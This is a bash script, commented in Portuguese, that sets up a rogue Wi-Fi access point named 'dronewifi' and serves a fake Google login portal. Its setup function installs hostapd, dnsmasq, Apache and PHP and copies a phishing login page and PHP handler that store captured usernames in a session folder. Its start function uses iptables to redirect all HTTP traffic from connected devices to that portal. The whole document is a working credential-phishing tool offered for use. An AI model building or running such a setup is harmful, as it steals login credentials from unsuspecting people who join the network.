#!/bin/bash

# Configurações
INTERFACE="wlan0"
SSID="dronewifi"
FAKE_PORTAL_DIR="/var/www/html/google"
SESSION_DIR="~/Documents/dronehack/session"
IP_ADDRESS="192.168.150.1/24"
DHCP_RANGE="192.168.150.10,192.168.150.100,255.255.255.0,12h"

setup_ap() {
    echo "Configurando o ambiente para o ponto de acesso..."

    # Instalar dependências
    sudo apt-get install -y hostapd dnsmasq apache2 php libapache2-mod-php

    # Configurar hostapd
    sudo bash -c "cat > /etc/hostapd/hostapd.conf" <<EOL
interface=$INTERFACE
ssid=$SSID
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOL

    sudo sed -i "s|^#DAEMON_CONF=.*|DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"|g" /etc/default/hostapd

    # Configurar dnsmasq
    sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
    sudo bash -c "cat > /etc/dnsmasq.conf" <<EOL
interface=$INTERFACE
dhcp-range=$DHCP_RANGE
dhcp-option=3,192.168.150.1
dhcp-option=6,192.168.150.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=192.168.150.1
EOL

    # Configurar IP estático
    sudo bash -c "echo 'interface $INTERFACE' >> /etc/dhcpcd.conf"
    sudo bash -c "echo 'static ip_address=$IP_ADDRESS' >> /etc/dhcpcd.conf"
    sudo bash -c "echo 'nohook wpa_supplicant' >> /etc/dhcpcd.conf"

    # Configurar Apache e portal falso
    sudo mkdir -p $FAKE_PORTAL_DIR
    sudo mkdir -p $SESSION_DIR

    sudo cp ~/Documents/dronehack/google/login.html $FAKE_PORTAL_DIR/index.html
    sudo cp ~/Documents/dronehack/google/login.php $FAKE_PORTAL_DIR/login.php

    # Atualizar o login.php para salvar os dados na pasta correta
    sudo sed -i "s|session/usernames.txt|$SESSION_DIR/usernames.txt|g" $FAKE_PORTAL_DIR/login.php

    echo "Configuração do ambiente concluída."
}

start_ap() {
    echo "Iniciando o ponto de acesso..."

    # Reiniciar serviços
    sudo systemctl restart dhcpcd
    sudo systemctl start hostapd
    sudo systemctl start dnsmasq
    sudo systemctl restart apache2

    # Configurar redirecionamento para o portal falso
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.150.1:80
    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
    sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

    echo "Ponto de acesso 'dronewifi' iniciado."
}

stop_ap() {
    echo "Parando o ponto de acesso..."

    sudo systemctl stop hostapd
    sudo systemctl stop dnsmasq
    sudo iptables -t nat -F
    sudo iptables -t nat -X
    sudo bash -c "echo 0 > /proc/sys/net/ipv4/ip_forward"
    sudo systemctl restart NetworkManager

    echo "Ponto de acesso 'dronewifi' parado."
}

case "$1" in
    --setup)
        setup_ap
        ;;
    start)
        start_ap
        ;;
    stop)
        stop_ap
        ;;
    *)
        echo "Uso: $0 {--setup|start|stop}"
        exit 1
        ;;
esac
# sudo ./setup_dronewifi.sh --setup Executa a configuração inicial apenas uma vez. Isso instala as dependências, configura o hostapd, dnsmasq, Apache e o portal falso.

# sudo ./setup_dronewifi.sh start start: Inicia o ponto de acesso usando as configurações já feitas.

# sudo ./setup_dronewifi.sh stop stop: Para o ponto de acesso e restaura a configuração de rede original.
